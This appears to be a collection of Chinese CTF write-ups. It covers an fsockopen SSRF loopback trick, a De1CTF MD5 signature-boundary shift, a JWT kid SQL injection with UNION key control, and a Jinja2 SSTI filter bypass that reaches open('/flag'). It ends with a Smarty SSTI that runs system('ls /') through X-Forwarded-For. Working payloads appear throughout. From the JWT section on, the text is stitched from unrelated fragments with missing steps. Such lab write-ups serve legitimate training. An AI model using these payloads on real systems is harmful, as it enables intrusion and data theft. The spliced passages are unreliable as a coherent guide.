    [HNCTF 2022 WEEK2] ez_ssrf — fsockopen 自己给自己发一条 HTTP

    题目类型：PHP 代码审计 — fsockopen 造成的 SSRF（本机回环绕过来源校验）

    Flag：nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    题目概述

    提示让进 index.php，进去就是源码。highlight_file(__FILE__)，一点遮挡都没有。

    同时扫目录扫到 flag.php，但直接访问它，返回的是 localhost plz。

    解题过程

    Step 1：先看源码

    <?php
highlight_file(__FILE__);
error_reporting(0);

$data = base64_decode($_GET['data']);
$host = $_GET['host'];
$port = $_GET['port'];

$fp = fsockopen($host, intval($port), $error, $errstr, 30);
if (!$fp) {
    die();
} else {
    fwrite($fp, $data);
    while (!feof($data)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}

    三个参数全部来自 GET，而且都直接进函数：

    host  →  fsockopen 的第一个参数
port  →  第二个参数（有 intval）
data  →  base64 解码后直接写进 socket

    fsockopen 是“建立一条 TCP 连接”，fwrite 是“往这条连接里发原始字节”。

    这等于给了我们一个可以手写任意 TCP 报文的口子。

    Step 2：为什么改 Host 头没用

    flag.php 检查的不是请求头里的 Host，而是连接的来源地址（$_SERVER['REMOTE_ADDR']）。

    所以你在浏览器或 Burp 里把 Host: localhost 改掉，来源地址还是你自己的 IP，一样被拒。

    这就是这题的题眼：改“名字”没用，得改“谁在连”。

    要让来源变成 127.0.0.1，只有一条路——让服务器自己去连自己。

    Step 3：构造发出去的报文

    fsockopen('127.0.0.1', 80) 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。

    接下来 fwrite($fp, $data) 会把 data 原样写进这个 socket。既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**

    GET /flag.php HTTP/1.1
Host: localhost
Connection: close

    注意三件事：

    ① 每一行结尾必须是 \r\n（CRLF），不是 \n
② 最后要有一个空行（\r\n\r\n），表示请求头结束
③ Connection: close 让对端在响应完就关闭连接，
   这样后面 fgets 才能读到 EOF，不会一直挂着

    编码成 base64：

    import base64

raw = "GET /flag.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
print(base64.b64encode(raw.encode()).decode())

    得到：

    R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    Step 4：为什么建议用脚本生成 base64

    \r\n 这两个字符最容易在“复制粘贴”里丢掉。

    很多在线 base64 工具、聊天框、编辑器，会把 \r\n 悄悄规范成 \n，你看起来“一模一样”，但发出去的报文行尾是 LF，服务端解析请求行的时候就错了。

    所以这题的编码一定在脚本里做：让 \r\n 从代码里生成，不让它经过剪贴板。

    Step 5：打完整 payload

    index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

    服务器做的事：

    fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
fwrite 我们的 HTTP 报文         请求 /flag.php
while 循环 fgets 读回响应       flag 就在响应体里
echo                           输出到页面

    拿到：

    nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}

    顺带解释：为什么这题“回应有点慢”

    源码里这句是写错了的：

    while (!feof($data)) {      // $data 是字符串，不是文件句柄
    echo fgets($fp, 128);
}

    feof() 的参数应该是文件句柄（这里该是 $fp）。传字符串进去，它只会返回 false（配合 error_reporting(0)，连警告都看不到）。

    于是 !feof($data) 恒为真——这个循环实际上是个死循环。

    它能“结束”，靠的是：

    对端响应完 → Connection: close 关闭连接
→ fgets($fp) 读到 EOF 返回 false
→ echo false 什么也不输出，但循环还在转
→ 直到 PHP 脚本超时（或连接彻底断掉）才停

    flag 在第一轮就已经被 echo 出去了，所以你能看到结果；但请求会一直挂到超时，这就是“慢”的来源。**

    如果按正确写法 feof($fp)，读到 EOF 就该退出循环，响应会立刻返回。

    关键点 说明
    fsockopen 建立 TCP 连接，host/port 全可控 → SSRF
    来源校验 flag.php 判的是 REMOTE_ADDR，不是 Host 头
    绕过思路 让服务器连自己（127.0.0.1），来源就变成内网
    data base64 解码后原样 fwrite，等于手写 TCP 报文
    报文格式 行尾 \r\n，头部结束后要空行 \r\n\r\n
    Connection: close 让对端响应后关连接，fgets 才能读到 EOF
    feof($data) 源码笔误（应为 $fp），导致死循环 → 响应慢
    base64 陷阱 剪贴板/工具会把 \r\n 变 \n，必须在脚本里生成
    完整请求 
    GET /index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=

data 解码后：
GET /flag.php HTTP/1.1\r\n
Host: localhost\r\n
Connection: close\r\n
\r\n
    这题踩的坑

    ① 改 Host 头

    Host: localhost 改与不改都没用——服务端看的不是这个头，是 TCP 连接的来源地址。

    ② payload 里手写 127.0.01

    少一位点。127.0.01 在很多系统里解析不到，或者被当成别的写法，连接直接失败。

    ③ 在线工具转 base64

    \r\n 被吃成 \n，报文行尾就错了。这题的编码必须在脚本里做。

    ④ 以为响应慢是网络问题

    是源码里 feof($data) 写错导致的死循环，跟网络无关。

    [De1CTF 2019] SSRF Me — 拼接没有分隔符，签名可以跨动作借

    题目类型：Python 代码审计 — 签名拼接边界移位 + SSRF

    Flag：CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}

    题目概述

    页面直接给出源码，但缩进和换行全乱了——粘进 VS Code 先 Shift+Alt+F 格式化一遍再读，否则没法审计。

    这题的坑不在 SSRF 本身（那个一眼就能看出来），在签名怎么过。

    解题过程

    Step 1：先看 sign 校验

    入口两个路由，/De1ta 才是能打的：

    @app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if (waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

    三个输入来自两处：

    cookies 里取 action 和 sign
query   里取 param

    校验在 Task.checkSign()：

    def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

    所以规则是：md5(secret_key + param + action) 必须等于你 cookie 里的 sign。

    secert_key = os.urandom(16)（源码里就是这么拼的）——每次启动重新随机，算不出来，只能想办法让服务器自己算。

    Step 2：Exec 里先看 action 包含什么

    def Exec(self):
    result = {}
    result['code'] = 500
    if (self.checkSign()):
        if "scan" in self.action:
            tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
            resp = scan(self.param)
            if (resp == "Connection Timeout"):
                result['data'] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
                result['code'] = 200
        if "read" in self.action:
            f = open("./%s/result.txt" % self.sandbox, 'r')
            result['code'] = 200
            result['data'] = f.read()
        if result['code'] == 500:
            result['data'] = "Action Error"
    else:
        result['code'] = 500
        result['msg'] = "Sign Error"
    return result

    注意两处用的是 in，不是 ==：

    if "scan" in self.action:
if "read" in self.action:

    这意味着 action 可以同时包含 scan 和 read——这也是后面能成的原因。

    两个分支各干一件事：

    scan  把 scan(param) 的结果写进 ./<sandbox>/result.txt
read  把 result.txt 读出来，放进 result['data'] 返回

    sandbox = md5(remote_addr)，也就是每个 IP 一个目录。

    所以光有 scan 你是看不到结果的（响应里只有 {"code":200}），光有 read 你读的是一个空文件。必须两个都在。

    Step 3：scan 就是 SSRF

    def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

    param 被原样丢进 urllib.urlopen()——它能打开 URL，也能打开本地文件。

    这里有个容易看错的细节：[:50] 是前 50 个字符，不是前 50 行。要读 50 行得先 splitlines()。这题 flag 短，50 个字符够了，所以看不出差别。

    Step 4：WAF 拦了什么

    def waf(param):
    check = param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

    只拦两个前缀：gopher 和 file。

    所以 file:///flag.txt 会被拦，但 flag.txt 不会——"flag.txt".startswith("file") 是 False（第四个字符是 g 不是 e）。

    相对路径的 flag.txt 会被 urlopen 当成当前工作目录下的文件打开。这题就是从这里读 flag 的。

    Step 5：签名怎么来——/geneSign 是签名机

    # generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

    它的 action 是写死的 scan，param 从 query 取。你给它什么 param，它就返回 md5(secret + param + "scan")。

    这就是个“只能签 scan”的签名机。

    Step 6：为什么签名能用到 action=readscan 上

    因为拼接没有分隔符：

    geneSign  →  md5(secret + "flag.txtread" + "scan")   = md5(secret + "flag.txtreadscan")
De1ta     →  md5(secret + "flag.txt"     + "readscan") = md5(secret + "flag.txtreadscan")

    字符串完全一样，只是切分位置不同。

    我要的是 action=readscan（同时含 scan 和 read）、param=flag.txt。这两段拼起来是 flag.txt + readscan = flag.txtreadscan。**

    那我只要让 geneSign 的 param 变成 flag.txtread，它算出来的就是同一个值：

    GET /geneSign?param=flag.txtread
→ c3bc4d1cf57f54db59b48b82a6ae06ad

    拿到这 32 位，就是 /De1ta 要的 sign。

    Step 7：打 /De1ta

    三样东西要一起给：

    Cookie: action=readscan
Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad
URL:    /De1ta?param=flag.txt

    执行顺序是：

    checkSign() 通过
  → action 含 scan  → scan("flag.txt") 读到 CTF2{...}，写进 result.txt
  → action 含 read  → 读回 result.txt，放进 result['data']

    返回：

    {"code": 200, "data": "CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"}

    疑问：/geneSign 为什么会在页面上“打印”出那串 md5

    因为 Flask 的视图函数 return 什么，HTTP 响应体就是什么。

    return getSign(action, param)

    getSign 返回的是 hexdigest() 的 32 位字符串，geneSign 把它原样 return 给 Flask，Flask 没有套模板、没有包 JSON，直接把它当响应正文发回去。

    所以浏览器拿到 text/html 的 32 个字符，就在页面上原样显示出来了。不是“打印日志”，是响应体就是这个字符串。

    反过来想，这也说明 secret_key 每次启动都变：不现场问这个接口要，签名根本算不出来。

    关键点 说明
    in 而非 == action 可以同时含 scan 和 read，这是解题前提
    scan / read 分工 scan 写文件、read 读回来，少一个都拿不到数据
    sandbox = md5(ip) 每个 IP 一个目录，自己打自己才有文件
    [:50] 截前 50 个字符，不是 50 行
    WAF 只拦 gopher / file 前缀，flag.txt 不在其中
    secert_key 每次启动随机（源码拼写如此），只能靠预言机签名
    拼接边界 md5(secret + param + action) 无分隔符 → 可以跨字段挪边界
    完整请求 
    ① 取签名
GET /geneSign?param=flag.txtread
→ c3bc4d1cf57f54db59b48b82a6ae06ad

② 打目标
GET /De1ta?param=flag.txt
Cookie: action=readscan
Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad

→ {"code": 200, "data": "CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"}
    这题踩的坑

    ① 以为 [:50] 是 50 行

    代码审计时这种“看起来像”最容易滑过去。read()[:50] 是字符串切片，单位是字符。

    ② 以为 action 只能取一个值

    if "scan" in self.action 是子串判断，readscan、scanread 都能进两个分支。看到 in 就该想到拼接。

    ③ 签名只能用在“它签的那个动作”上

    直觉上 /geneSign 签的是 scan，所以只能用在 action=scan。但拼接没有分隔符，flag.txt + readscan 和 flag.txtread + scan 是同一个字符串——边界可以挪。

    ④ 只设 param，忘了 action 和 sign

    这三样是三个位置（query、cookie、cookie），少一个都进不去。

    [zeroG] Stage 2 - 企业级综合管理后台 —— kid 拼进 SQL，公钥当 HMAC 密钥

    题目类型：JWT 认证绕过（kid 注入 + 算法混淆）→ 命令注入

    Flag：ZeroGFlag{...}（动态环境，每次重建实例都不一样，只有链路可复用）

    题目概述

    和 ZeroG_2026（Stage 2）、Stage2 — Internal Shop 都不是同一题 —— 那两篇是 PHP 弱类型和 SSRF，这篇是 JWT 认证绕过。

    题目给的演示账号是 zhangsan / password123，题面特意强调了一句「认证采用 JWT」，所以一进来先把注意力放在令牌上。

    登录后能看到的只有公告、通讯录、文档三个模块，都是正常的展示，没有可动的参数。

    信息收集

    页面上翻不出东西，先扫目录。

    这个站有个坑，会把扫描结果全部污染

    任何不存在的路径都返回 200 + 首页（53671 字节）。按状态码筛会得到几百个假的「200」，只能按长度排掉：-mc 200 -fs 53671。

    扫出来两个东西：

    路径 是什么
    /admin.html 后台入口，直接访问返回「权限不足，仅管理员可访问」
    /jwks.json JWKS，里面是 RSA 公钥（kid: ops-console-2024）

    两个当时都用不上——/admin.html 要管理员身份，jwks.json 是验签用的公钥，不知道往哪使。先记着。

    第一关：把 kid 拼进 SQL

    先把登录拿到的令牌拆开：

    {"alg":"HS256","kid":"key_002","typ":"JWT"}
{"sub":"zhangsan","name":"张三","role":"user", ...}

    kid 是「密钥编号」。key_002 这种命名说明服务端是按 kid 去一张密钥表里挑密钥，而不是全站共用一把。

    把 kid 改成一个带单引号的值：

    "kid": "key_002'"

    再请求 /admin.html，返回 500，Werkzeug 的调试页把整句 SQL 原样打了出来：

    SELECT secret_key FROM jwt_keys WHERE key_id = 'key_002''

    结论：kid 是直接字符串拼进 SQL 的，没有参数化。

    关键理解：要控制的是「返回值」，不是「条件」

    写法 WHERE 查询结果 能不能用
    key_002' OR 1=1 -- 恒真 表里真实存在的密钥 ❌ 密钥你不知道，签名照样做不出来
    x' union select 'abc' -- 查不到 x 你指定的 abc ✅ 密钥变成你能签的东西

    第一条是我第一反应写的 OR 1=1。它的问题在于只改变「选哪些行」，不改变「选出来的值」——服务端拿到的还是真密钥，你手里的签名对不上，403。

    UNION 才是把外部值塞进结果集的办法：

    kid = x' union select 'abc' -- 
      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
      │                └──────── 你指定的密钥，记牢，下一步签名要用
      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行

    fetchone() 只取第一行，所以前缀必须查不到，否则拿到的还是真密钥，注入白做。

    三个条件必须同时满足

    # 条件 写错会怎样
    1 kid 前缀在表里查不到 取到真密钥 → 403
    2 签名用 abc 当 HMAC 密钥重算 签名对不上 → 403
    3 payload 里 role 是 admin 验签过了但角色不对 → 403

    三种错法返回的页面一模一样，只能逐条核对，不能靠试。

    令牌用脚本生成，不要手改：

    ① 魔术方法 = 自动触发的“钩子”

    ③ 最终的 sink 是 file_get_contents('/flag')

    链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。

    关键知识点

    魔术方法 触发条件

    __toString() 对象被当成字符串使用（拼接、echo、比较）
    __call($name,$args) 调用了不存在的方法
    __clone() 对象被 clone 时
    __isset($name) 对不存在/不可访问的属性调用 isset() 或 empty()
    __invoke() 对象被当成函数调用，如 $obj()

    本题源码里四个类的属性在页面截图上都是 public，所以直接写属性名就行。

    public     s:4:"name";          直接写名字
protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0

    本地构造时要按目标类的真实可见性来写，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。

    这题的起点是 __destruct——它不需要任何操作就会触发，所以从“谁最先被自动调用”往回推，比从入口 unserialize 正着推更快。

    ② 把它当成“倒推题”而不是“写代码题”

    链子上每一环的答案都藏在别的类里，不需要写新代码，只需要摆对象。

    {{7*7}}      →  49

    Step 2：摸 WAF

    试 {{''.__class__}}，回的是：

    ' in blacklist

    然后就是一直试、一直试，最后发现封了这些：

    字符    空格、Tab、'、"、_、.、[、]  以及单独的 |
词      os / popen / request / class / mro / globals / builtins /
        import / read / system / eval / args / cookies / init / getitem

attr join batch first last list items get open dict config lipsum self

    一穷二白——没有引号、没有下划线、没有点、没有方括号，连空格都没有。

    但 ( ) ~ {} 还在，所以还有得打。

    Step 3：空格没了，用垂直制表符

    本文里用 ␋ 代表那个字节（0x0B，垂直制表符）。 它只是排版用的占位符，不是能打出来的字符——发送时要换成真字节，urlencoded body 里写 %0B。

    {%set␋%} 这种语句必须有空白分隔。空格和 Tab 都被拦了，那就找别的空白字符。

    0x0B  垂直制表符  ✓ 能用
0x0C  换页符      ✓ 能用
0x0A  换行        ✓ 能用
0x09  Tab         ✗ 拦
0x20  空格        ✗ 拦

    于是 {%set␋x=7*7%}{{x}} → 49，语句标签全套复活。

    这里踩过一个坑：0x0B、\x0b、\s 这三个都不是那个字符本身。

    0x0B    数字的十六进制写法（等于 11）——{{0x0B}} 渲染出来是 11
\x0b    字符串里的转义序列
\s      正则里的"空白类"，根本不是字符

    payload 里要的是那个字节本身。POST 的 body 是 urlencoded，所以写成 %0B 最省事。

    Step 4：把 _ 造出来（config 字符农场）

    这一段是整题的核心。先看两个回显：

    {{config|list}}                →  ['ENV', 'DEBUG', 'TESTING', ..., 'MAX_COOKIE_SIZE']
{{config|list|last}}           →  MAX_COOKIE_SIZE
{{config|list|last|batch(4)}}  →  ['M','A','X','_'], ['C','O','O','K'], ['I','E','_','S'], ['I','Z','E']

    |batch(4) 把字符串每 4 个切成一组，第一组是 ['M','A','X','_']。

    我们只有 |first 和 |last 两个取法，所以只能拿"每组的第一个"或"每组的最后一个"。_ 正好在第一组的末尾：

    {{config|list|last|batch(4)|first}}       →  ['M','A','X','_']
{{config|list|last|batch(4)|first|last}}  →  '_'

    由此得到通用公式：

    第 n 个字符  =  |list|batch(n)|first|last

    这就是 [n] 被封之后的替代品——不用引号、不用方括号。

    Step 5：把 / 也造出来

    / 不在键名里，在值里：config 里有一项 APPLICATION_ROOT 的值是 /。

    要把"键值对"拿出来，得调 config.items()——但点被拦了，只能 |attr(字符串)()。

    而"items"这个词也写不出来（引号没了），于是用 dict 造词：

    dict(items=1)              →  {'items': 1}
dict(items=1)|join         →  items          ← 字典 join 出来是它的键
config|attr(dict(items=1)|join)       →  <built-in method items ...>
config|attr(dict(items=1)|join)()     →  dict_items([('ENV','production'), ...])

    拿到键值对之后，/ 在第 10 对 ('APPLICATION_ROOT', '/') 的第二个位置：

    {{config|attr(dict(items=1)|join)()|batch(10)|first|last|last}}   →  '/'

    batch(10)|first 取前 10 对，|last 取第 10 对，再 |last 取这一对的第二个元素 = /。

    Step 6：把 . 造出来

    . 也能算：1/2 是 0.5，里面有现成的点。

    {{1/2}}                              →  0.5
{{(1/2)|string|batch(2)|first|last}} →  '.'

    Step 7：用 dict + ~ 拼禁词

    globals、builtins、read、os、open……这些词不能连着出现，拆开拼：

    dict(gl=1)|join ~ dict(obals=1)|join     →  globals
dict(built=1)|join ~ dict(ins=1)|join    →  builtins
dict(re=1)|join ~ dict(ad=1)|join        →  read
dict(o=1)|join ~ dict(s=1)|join          →  os
dict(open=1)|join                        →  open（不封，直接用）
dict(get=1)|join                         →  get（不封）

    注意 ~ 是字符串拼接：{{1~2}} → '12'，而 {{1+2}} → 3。

    也注意别拼错：gl + obals = globals，不是 gl + oblas。

    Step 8：组装

    把造出来的东西存进变量（set 就是赋值，只存不显示）：

    {%set␋U=config|last|list|batch(4)|first|last%}                      U  = _
{%set␋GS=U~U~dict(gl=1)|join~dict(obals=1)|join~U~U%}               GS = __globals__
{%set␋GT=dict(get=1)|join%}                                         GT = get
{%set␋BB=U~U~dict(built=1)|join~dict(ins=1)|join~U~U%}              BB = __builtins__
{%set␋SL=config|attr(dict(items=1)|join)()|batch(10)|first|last|last%}  SL = /
{%set␋RD=dict(re=1)|join~dict(ad=1)|join%}                          RD = read

    最后一步：

    {{lipsum|attr(GS)|attr(GT)(BB)|attr(GT)(dict(open=1)|join)(SL~dict(flag=1)|join)|attr(RD)()}}

    lipsum.__globals__['__builtins__'].get('open')('/flag').read()

    ['opt','root','media','home','proc','tmp','lib','boot','etc','lib64','dev','sys','sbin',...]

    （这道题的平台给的是裸 TCP 地址，但它其实是个 HTTPS 服务，所以我直接用 https://host:9999/ 访问，不需要 nc / openssl。）

    Step 2：改完还能正常输出，那就试模板注入

    先上最基础的探针：

    X-Forwarded-For: {{7*7}}      →  49

    模板被执行了。但这一刻不要急着下结论。

    Step 3：{{7*'7'}} 才是分水岭

    X-Forwarded-For: {{7*'7'}}    →  49

    这个结果说明引擎把 '7' 当成数字处理了 —— 那是 PHP 系模板的行为。

    引擎 7*'7' 的结果
    Jinja2（Python） 7777777（字符串重复）
    Smarty / Twig（PHP） 49（转成数字相乘）

    所以这不是 Jinja2。看报错也印证了：

    Uncaught --> Smarty Compiler: Syntax error in template …
thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php

    sysplugins/smarty_internal_* 就是 Smarty 的源码目录。

    这一步我走了弯路：一开始按题名以为是 Flask 版，直接套 __class__ 那条链，结果报错说 Smarty 语法不对。只测 {{7*7}} 是不够的 —— Jinja 和 Smarty 都回 49。

    Step 4：确认 Smarty 版本

    X-Forwarded-For: {$smarty.version}


    Your IP is : 3.1.34-dev-7

    Smarty 3.1。这意味着 Smarty 2 时代的 {php}…{/php} 标签已经被移除了，那条路走不通。

    Step 5：Smarty 3 的路子是 {if}

    Smarty 的 {if} 表达式最终会被编译成 PHP 的 if (...)，而表达式里的函数调用会被原样写进编译结果。

    // {if phpinfo()}{/if}  编译后大致是：
if (phpinfo()) { }

    所以先验证这条路通不通：

    X-Forwarded-For: {if phpinfo()}{/if}

    成功返回了 phpinfo 页面。

    phpinfo 里翻两件事：

    disable_functions   →  空        （system / exec 都没禁）
open_basedir        →  没设      （没有被限制目录）

    顺手看了环境变量，只有一个 FLAG=not_flag：

    这是干扰项，别信。

    注意 {if} 只判断真假，不打印值。所以要挑"自己会 echo 出来"的函数。system 属于这类。

    X-Forwarded-For: {if system('ls /')}{/if}

    漏洞原理

    ① 输入来源不只是参数，还有请求头

    X-Forwarded-For 是代理用来传递客户端 IP 的头。如果应用直接信任它、又把它拼进模板，那就同时拿到"注入点"和"可伪造的输入"。

    ② 模板引擎把"表达式"编译成代码

    Smarty 把 {if 表达式} 编译成 PHP 的 if (表达式)。只要表达式里允许出现函数调用，就等于允许执行 PHP 函数。这和 Jinja 的 {{ }} 能访问对象属性是同一类问题的不同表现。

    ③ {if} 只判真假，不打印值

    if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到
if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白

    所以要选"会输出"的函数（phpinfo、system、readfile、print），或者把返回值再套一层输出函数。

    关键知识点

    知识点 说明
    X-Forwarded-For 伪造客户端 IP；应用信任它就是注入点
    {{7*7}} 只证明"模板被执行"，不能分辨引擎
    {{7*'7'}} Jinja2 → 7777777；PHP 系 → 49
    Smarty 语法 {标签} / {$变量} / {$var\|修饰符}，没有对象属性访问
    {$smarty.version} Smarty 内置变量，看版本
    Smarty 2 vs 3 {php}…{/php} 在 3.x 已移除
    {if 函数()}{/if} Smarty 3 里调用 PHP 函数的入口
    disable_functions / open_basedir 决定拿到函数调用之后能走多远
    环境变量里的 FLAG=not_flag 干扰项，别信
    这题踩的两个坑

    ① 认错引擎

    只测了 {{7*7}} 回 49 就往 Jinja2 的 __class__ 链上走，报错才发现是 Smarty。

    教训：{{7*7}} 只证明"模板在执行"，{{7*'7'}} 才区分引擎。

    ② 中文引号

    手打 payload 时输入法给了 ‘’（U+2018/U+2019），Jinja/Smarty 都不认，报 unexpected char。

    打模板时把输入法切英文；报错里连位置都给了（at 2），照着看就行。
